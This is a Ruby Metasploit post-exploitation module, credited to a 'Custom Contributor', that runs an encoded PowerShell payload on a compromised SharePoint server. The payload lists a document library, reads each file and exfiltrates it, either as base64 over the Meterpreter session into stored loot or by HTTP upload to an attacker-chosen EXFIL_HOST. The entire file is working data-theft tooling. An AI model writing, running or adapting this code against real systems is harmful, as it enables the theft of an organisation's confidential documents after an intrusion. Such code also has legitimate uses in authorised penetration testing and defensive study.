require 'msf/core'

class MetasploitModule < Msf::Post::Windows::Powershell
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SharePoint Document Library Enumerator and Extractor',
        'Description' => %q{
          Enumerates and extracts documents from a specified SharePoint library using the
          SharePoint .NET API. Designed to run in an existing Windows session (e.g., Meterpreter)
          on a SharePoint server. Supports exfiltration via HTTP or Meterpreter channels,
          with configurable filters for file size and library targeting. Requires execution
          in a context with access to SharePoint assemblies and appropriate permissions.
        },
        'Author' => ['Custom Contributor'],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'SessionTypes' => ['meterpreter', 'shell'],
        'References' => [['URL', 'https://docs.microsoft.com/en-us/sharepoint/dev/']],
        'Compat' => { 'Meterpreter' => true },
        'Notes' => {
          'Stability' => [STABILITY_CRASH_SAFE],
          'Reliability' => [RELIABILITY_REPEATABLE_SESSION],
          'SideEffects' => [SIDE_EFFECTS_NETWORK_TRAFFIC]
        }
      )
    )

    register_options([
      OptString.new('SITE_URL', [true, 'Full URL of the SharePoint site', 'http://sharepoint.local']),
      OptString.new('LIBRARY', [true, 'Target document library name', 'Documents']),
      OptString.new('EXFIL_METHOD', [true, 'Exfiltration method (HTTP or METERPRETER)', 'METERPRETER']),
      OptString.new('EXFIL_HOST', [false, 'Host for HTTP exfiltration', '']),
      OptInt.new('EXFIL_PORT', [false, 'Port for HTTP exfiltration', 8080]),
      OptInt.new('MAX_SIZE', [true, 'Max file size to exfiltrate (bytes)', 10485760]) # 10MB default
    ])
  end

  def check
    if session.platform != 'windows'
      return [Exploit::CheckCode::Incompatible, 'Target is not a Windows system']
    end

    [Exploit::CheckCode::Appears, 'Module ready to run on Windows session']
  end

  def run
    unless session
      fail_with(Failure::NoSession, 'No active session available')
    end

    handle_exfiltration_config
    print_status('Generating SharePoint document extractor payload...')
    ps_script = build_ps_payload
    encoded_cmd = cmd_psh_payload(ps_script, 'x86', { encode: true })

    print_status("Executing payload on target session #{session.sid}...")
    if session.type == 'meterpreter'
      output = session.shell_command("powershell.exe -EncodedCommand #{encoded_cmd}")
      process_output(output)
    else
      session.shell_write("powershell.exe -EncodedCommand #{encoded_cmd}\n")
      print_status('Check session output manually for results.')
    end
  end

  def build_ps_payload
    dotnet_code = <<~CSHARP
      using Microsoft.SharePoint;
      using System;
      using System.IO;
      using System.Net;

      public class SharePointExtractor {
        public static void ExtractDocs(string siteUrl, string libraryName, string exfilMethod, string exfilHost, int exfilPort, long maxSize) {
          try {
            using (SPSite site = new SPSite(siteUrl)) {
              using (SPWeb web = site.OpenWeb()) {
                SPList list = null;
                try {
                  list = web.Lists[libraryName];
                } catch {
                  Console.WriteLine("ERROR:LibraryNotFound:" + libraryName);
                  return;
                }

                SPDocumentLibrary library = list as SPDocumentLibrary;
                if (library == null) {
                  Console.WriteLine("ERROR:NotADocumentLibrary:" + libraryName);
                  return;
                }

                Console.WriteLine("INFO:Enumerating:" + libraryName + ":" + library.Items.Count + " items");
                foreach (SPListItem item in library.Items) {
                  try {
                    SPFile file = item.File;
                    if (file.Length > maxSize) {
                      Console.WriteLine("SKIP:SizeExceeded:" + file.Name + ":" + file.Length);
                      continue;
                    }

                    byte[] fileBytes = file.OpenBinary();
                    string fileName = file.Name;

                    if (exfilMethod.ToUpper() == "HTTP" && !string.IsNullOrEmpty(exfilHost)) {
                      using (WebClient client = new WebClient()) {
                        client.Headers.Add("X-Filename", fileName);
                        client.UploadData("http://" + exfilHost + ":" + exfilPort + "/upload", fileBytes);
                        Console.WriteLine("SUCCESS:HTTP:" + fileName + ":" + fileBytes.Length);
                      }
                    } else {
                      string b64 = Convert.ToBase64String(fileBytes);
                      Console.WriteLine("FILE:" + fileName + ":" + b64);
                    }
                  } catch (Exception ex) {
                    Console.WriteLine("ERROR:FileProcessing:" + item.Name + ":" + ex.Message);
                  }
                }
              }
            }
          } catch (Exception e) {
            Console.WriteLine("FATAL:GeneralError:" + e.Message);
          }
        }
      }
    CSHARP

    <<~PS
      try {
        Add-Type -TypeDefinition @"
        #{dotnet_code}
        "@ -ReferencedAssemblies "Microsoft.SharePoint.dll","System.Web.dll" -ErrorAction Stop
        [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}',#{' '}
          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']},#{' '}
          #{datastore['MAX_SIZE']})
      } catch {
        Write-Output "FATAL:AssemblyLoadError:" + $_.Exception.Message
      }
    PS
  end

  def handle_exfiltration_config
    method = datastore['EXFIL_METHOD'].upcase
    if method == 'HTTP' && (!datastore['EXFIL_HOST'] || datastore['EXFIL_HOST'].empty?)
      fail_with(Failure::BadConfig, 'EXFIL_HOST required for HTTP exfiltration')
    elsif method == 'METERPRETER' && session.type != 'meterpreter'
      fail_with(Failure::BadConfig, 'METERPRETER exfiltration requires a Meterpreter session')
    end
    print_status("Exfiltration method: #{method}")
  end

  def process_output(output)
    return unless output && !output.empty?

    output.split("\n").each do |line|
      case line
      when /^FILE:([^:]+):(.*)$/
        file_name = ::Regexp.last_match(1)
        b64_data = ::Regexp.last_match(2)
        file_path = store_loot('sharepoint.document', 'application/octet-stream', session,
                               Rex::Text.decode_base64(b64_data), file_name)
        print_good("Saved #{file_name} to #{file_path}")
      when /^SUCCESS:HTTP:([^:]+):(\d+)$/
        print_good("Exfiltrated #{::Regexp.last_match(1)} via HTTP (#{::Regexp.last_match(2)} bytes)")
      when /^ERROR:(.+)$/
        print_error("Error: #{::Regexp.last_match(1)}")
      when /^INFO:(.+)$/
        print_status("Info: #{::Regexp.last_match(1)}")
      when /^SKIP:(.+)$/
        print_warning("Skipped: #{::Regexp.last_match(1)}")
      when /^FATAL:(.+)$/
        fail_with(Failure::Unknown, "Fatal error: #{::Regexp.last_match(1)}")
      end
    end
  end
end
